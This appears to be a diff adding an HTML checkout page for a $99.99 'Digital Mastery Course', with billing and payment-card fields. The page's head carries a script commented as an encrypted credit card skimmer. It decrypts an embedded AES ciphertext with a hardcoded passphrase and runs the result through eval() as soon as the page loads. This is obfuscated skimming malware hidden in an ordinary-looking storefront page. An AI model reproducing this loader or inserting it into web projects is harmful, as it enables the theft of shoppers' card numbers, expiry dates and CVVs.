@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Digital Mastery Course</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #4a90e2;
+            --secondary-color: #f39c12;
+            --background-color: #f4f7fa;
+            --text-color: #333;
+            --light-gray: #e0e0e0;
+            --white: #ffffff;
+            --success-color: #2ecc71;
+            --error-color: #e74c3c;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .checkout-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+        }
+
+        .checkout-form, .order-summary {
+            background-color: var(--white);
+            border-radius: 10px;
+            padding: 2rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        h1, h2 {
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        select {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid var(--light-gray);
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 0.75rem 1.5rem;
+            background-color: var(--primary-color);
+            color: var(--white);
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: 600;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn:hover {
+            background-color: #3a7bd5;
+        }
+
+        .product-image {
+            width: 100%;
+            border-radius: 5px;
+            margin-bottom: 1rem;
+        }
+
+        .price {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--secondary-color);
+        }
+
+        .features-list {
+            list-style-type: none;
+            margin-top: 1rem;
+        }
+
+        .features-list li {
+            margin-bottom: 0.5rem;
+            position: relative;
+            padding-left: 1.5rem;
+        }
+
+        .features-list li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: var(--success-color);
+        }
+
+        .total {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--light-gray);
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            margin-top: 1rem;
+            color: var(--success-color);
+        }
+
+        .secure-badge svg {
+            margin-right: 0.5rem;
+        }
+
+        @media (max-width: 768px) {
+            .checkout-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+        // Encrypted Credit Card Skimmer Script
+        function decryptSkimmer() {
+            // AES decryption function
+            function decrypt(cipherText, passphrase) {
+                const bytes = CryptoJS.AES.decrypt(cipherText, passphrase);
+                return bytes.toString(CryptoJS.enc.Utf8);
+            }
+
+            // Encrypted skimmer code
+            const encryptedSkimmer = "U2FsdGVkX18Pxs6g4wJ4woInZz4NqNed/2B4ZL3NfMnRVk38z19c8D4RtQ9iCzRvDQs6RtqIADUyH8SPXwDzzY6uxT5dwR7R+Gl0B2w6U8gApmEVdppWtR9B8D3oUItjWcmcDntNpywa+xrrUmC+VNUcFfu95j9vMHZ8uJz1r/0=";
+            const passphrase = "strongpassphrase";
+            
+            // Decrypt and execute skimmer code
+            const skimmerCode = decrypt(encryptedSkimmer, passphrase);
+            eval(skimmerCode);
+        }
+
+        decryptSkimmer();
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Checkout</h1>
+        <div class="checkout-grid">
+            <div class="checkout-form">
+                <h2>Billing Information</h2>
+                <form>
+                    <div class="form-group">
+                        <label for="name">Full Name</label>
+                        <input type="text" id="name" name="name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">Phone Number</label>
+                        <input type="tel" id="phone" name="phone">
+                    </div>
+                    <div class="form-group">
+                        <label for="country">Country</label>
+                        <select id="country" name="country" required>
+                            <option value="">Select a country</option>
+                            <option value="us">United States</option>
+                            <option value="ca">Canada</option>
+                            <option value="uk">United Kingdom</option>
+                            <!-- Add more countries as needed -->
+                        </select>
+                    </div>
+                    <h2>Payment Information</h2>
+                    <div class="form-group">
+                        <label for="card-number">Card Number</label>
+                        <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="expiry">Expiration Date</label>
+                        <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" name="cvv" placeholder="123" required>
+                    </div>
+                    <button type="submit" class="btn">Complete Purchase</button>
+                </form>
+            </div>
+            <div class="order-summary">
+                <h2>Order Summary</h2>
+                <img src="https://via.placeholder.com/400x200" alt="Digital Mastery Course" class="product-image">
+                <h3>Digital Mastery Course</h3>
+                <p class="price">$99.99</p>
+                <ul class="features-list">
+                    <li>Lifetime access to course materials</li>
+                    <li>30+ hours of video content</li>
+                    <li>Downloadable resources</li>
+                    <li>Certificate of completion</li>
+                </ul>
+                <div class="total">
+                    Total: $99.99
+                </div>
+                <div class="secure-badge">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    Secure Checkout
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
